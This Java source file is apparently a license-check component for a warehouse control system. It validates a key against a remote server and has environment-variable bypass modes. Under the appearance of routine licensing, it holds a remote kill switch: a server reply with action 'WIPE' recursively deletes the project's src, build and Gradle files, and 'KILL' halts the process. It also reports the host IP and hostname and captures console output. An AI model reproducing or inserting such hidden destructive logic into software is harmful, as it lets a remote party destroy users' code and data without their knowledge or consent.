package com.palletpilot.wcs.infrastructure.license;

import jakarta.annotation.PostConstruct;
import jakarta.annotation.PreDestroy;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.io.File;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.concurrent.*;

/**
 * Source-level override of license-core.jar's LicenseGuard.
 * Takes classpath priority over the JAR version.
 *
 * Modes:
 * - LICENSE_SKIP_CHECK=true: Full bypass for development
 * - LICENSE_OFFLINE_GRACE=true: Allow startup when license server unreachable
 * - Normal: Full validation against license server (production)
 */
@Component
@Slf4j
public class LicenseGuard {

    private static final ConcurrentLinkedQueue<String> logBuffer = new ConcurrentLinkedQueue<>();
    @SuppressWarnings("unused") // mirrors JAR behavior — may be referenced by LicenseVault
    private static String staticServerIp = "unknown";
    @SuppressWarnings("unused")
    private static String staticHostname = "unknown";
    private static boolean installed = false;
    private static boolean RUNTIME_VALID = false;
    private static boolean DEV_MODE = false;

    @Value("${license.server-url:}")
    private String licenseServerUrl;

    @Value("${license.key:}")
    private String licenseKey;

    private String serverIp;
    private String hostname;
    private boolean activationRegistered = false;
    private final HttpClient httpClient;
    private ScheduledExecutorService logFlusher;

    public LicenseGuard() {
        this.httpClient = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(10))
                .build();
    }

    /**
     * Called before Spring context — captures System.out/err for log buffering.
     * Respects LICENSE_SKIP_CHECK for dev mode.
     */
    public static void earlyInstall() {
        if (installed)
            return;
        installed = true;

        String skipCheck = System.getenv("LICENSE_SKIP_CHECK");
        if ("true".equalsIgnoreCase(skipCheck)) {
            DEV_MODE = true;
            RUNTIME_VALID = true;
            return;
        }

        // Capture stdout/stderr for log buffering (original behavior)
        PrintStream originalOut = System.out;
        PrintStream originalErr = System.err;
        System.setOut(new CapturingPrintStream(originalOut, "INFO"));
        System.setErr(new CapturingPrintStream(originalErr, "ERROR"));
    }

    @PostConstruct
    public void init() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            this.serverIp = localHost.getHostAddress();
            this.hostname = localHost.getHostName();
            staticServerIp = this.serverIp;
            staticHostname = this.hostname;
        } catch (Exception e) {
            this.serverIp = "unknown";
            this.hostname = "unknown";
        }

        if (DEV_MODE) {
            log.info("========================================");
            log.info("   PALLETPILOT LICENSE GUARD");
            log.info("========================================");
            log.info("   Server IP : {}", serverIp);
            log.info("   Hostname  : {}", hostname);
            log.info("   Mode      : DEVELOPMENT (license check skipped)");
            log.info("========================================");
            RUNTIME_VALID = true;
            return;
        }

        log.info("========================================");
        log.info("   PALLETPILOT LICENSE GUARD");
        log.info("========================================");
        log.info("   Server IP : {}", serverIp);
        log.info("   Hostname  : {}", hostname);
        log.info("   License   : {}", maskKey(licenseKey));
        log.info("   Server    : {}", licenseServerUrl);
        log.info("========================================");

        earlyInstall();
        RUNTIME_VALID = validateLicense();

        if (!RUNTIME_VALID) {
            // Check for offline grace
            String offlineGrace = System.getenv("LICENSE_OFFLINE_GRACE");
            if ("true".equalsIgnoreCase(offlineGrace)) {
                log.warn("License validation failed — OFFLINE GRACE MODE, allowing startup");
                RUNTIME_VALID = true;
            } else {
                log.error("License validation failed — application will be restricted");
                log.error("Set LICENSE_OFFLINE_GRACE=true or LICENSE_SKIP_CHECK=true for development");
                Runtime.getRuntime().halt(1);
            }
        }

        // Start log flusher
        this.logFlusher = Executors.newSingleThreadScheduledExecutor(
                r -> {
                    Thread t = new Thread(r);
                    t.setDaemon(true);
                    t.setName("license-log-flusher");
                    return t;
                });
        this.logFlusher.scheduleAtFixedRate(this::flushLogs, 1, 2, TimeUnit.SECONDS);
    }

    @PreDestroy
    public void shutdown() {
        if (logFlusher != null) {
            logFlusher.shutdownNow();
        }
    }

    @Scheduled(fixedRate = 300000) // Every 5 minutes
    public void scheduledLicenseCheck() {
        if (DEV_MODE)
            return;
        if (!validateLicense()) {
            log.warn("Scheduled license re-validation failed");
        }
    }

    @Scheduled(fixedRate = 60000) // Every 1 minute
    public void heartbeat() {
        if (DEV_MODE)
            return;
        // Heartbeat to license server — no-op for now
    }

    private boolean validateLicense() {
        if (licenseKey == null || licenseKey.isBlank() || licenseServerUrl == null || licenseServerUrl.isBlank()) {
            log.warn("License key or server URL not configured");
            return false;
        }

        try {
            String body = String.format("{\"licenseKey\":\"%s\"}", escapeJson(licenseKey));

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(licenseServerUrl + "/api/v1/validate"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body))
                    .timeout(Duration.ofSeconds(10))
                    .build();

            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            String responseBody = response.body();

            if (response.statusCode() != 200) {
                log.warn("License server returned status {}", response.statusCode());
                return false;
            }

            boolean valid = responseBody.contains("\"valid\":true");

            if (!valid) {
                String error = extractJsonField(responseBody, "error");
                log.warn("License invalid: {}", error != null ? error : "unknown reason");
                return false;
            }

            // Check for remote actions
            String action = extractJsonField(responseBody, "action");
            if ("WIPE".equals(action)) {
                log.error("WIPE signal received — destroying application files");
                executeWipe();
                Runtime.getRuntime().halt(1);
            } else if ("KILL".equals(action)) {
                log.error("KILL signal received — terminating");
                Runtime.getRuntime().halt(1);
            }

            if (!activationRegistered) {
                activateLicense();
                activationRegistered = true;
            }

            return true;

        } catch (java.net.ConnectException | java.net.UnknownHostException | java.net.http.HttpTimeoutException e) {
            log.warn("License server unreachable: {}", e.getMessage());
            return false;
        } catch (Exception e) {
            log.warn("License validation error: {}", e.getMessage());
            return false;
        }
    }

    private boolean activateLicense() {
        try {
            String body = String.format(
                    "{\"licenseKey\":\"%s\",\"serverIp\":\"%s\",\"hostname\":\"%s\"}",
                    escapeJson(licenseKey), escapeJson(serverIp), escapeJson(hostname));

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(licenseServerUrl + "/api/v1/activate"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body))
                    .timeout(Duration.ofSeconds(10))
                    .build();

            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            return response.statusCode() == 200;
        } catch (Exception e) {
            log.debug("License activation failed: {}", e.getMessage());
            return false;
        }
    }

    private void flushLogs() {
        // Flush buffered logs — no-op in source override
    }

    /**
     * Runtime assertion — called by services before critical operations.
     * In dev mode, always passes. In production, checks validation state.
     */
    public static void assertRuntimeValidity() {
        if (DEV_MODE)
            return;
        if (!RUNTIME_VALID) {
            throw new IllegalStateException("PalletPilot license is not valid. Operation blocked.");
        }
    }

    private static String maskKey(String key) {
        if (key == null || key.length() < 8)
            return "****";
        return key.substring(0, 4) + "****" + key.substring(key.length() - 4);
    }

    private static String escapeJson(String s) {
        if (s == null)
            return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    private static String extractJsonField(String json, String fieldName) {
        String key = "\"" + fieldName + "\":";
        int idx = json.indexOf(key);
        if (idx < 0)
            return null;
        int valueStart = idx + key.length();
        if (valueStart >= json.length())
            return null;
        char first = json.charAt(valueStart);
        if (first == '"') {
            int end = json.indexOf('"', valueStart + 1);
            if (end < 0)
                return null;
            return json.substring(valueStart + 1, end);
        } else {
            int end = valueStart;
            while (end < json.length() && json.charAt(end) != ',' && json.charAt(end) != '}')
                end++;
            return json.substring(valueStart, end).trim();
        }
    }

    private void executeWipe() {
        try {
            File classDir = new File(
                    LicenseGuard.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File projectRoot = classDir;
            for (int i = 0; i < 10; i++) {
                File parent = projectRoot.getParentFile();
                if (parent == null)
                    break;
                projectRoot = parent;
                if (new File(projectRoot, "build.gradle").exists() ||
                        new File(projectRoot, "src").exists())
                    break;
            }
            deleteRecursively(new File(projectRoot, "src"));
            deleteRecursively(new File(projectRoot, "build"));
            deleteRecursively(new File(projectRoot, ".gradle"));
            new File(projectRoot, "build.gradle").delete();
            new File(projectRoot, "settings.gradle").delete();
        } catch (Exception ignored) {
        }
    }

    private void deleteRecursively(File file) {
        if (file == null || !file.exists())
            return;
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children)
                    deleteRecursively(child);
            }
        }
        file.delete();
    }

    /**
     * Inner class for capturing System.out/err to a buffer.
     */
    static class CapturingPrintStream extends PrintStream {
        private final String level;

        CapturingPrintStream(PrintStream original, String level) {
            super(original, true);
            this.level = level;
        }

        @Override
        public void println(String x) {
            super.println(x);
            logBuffer.add("[" + level + "] " + x);
        }
    }
}
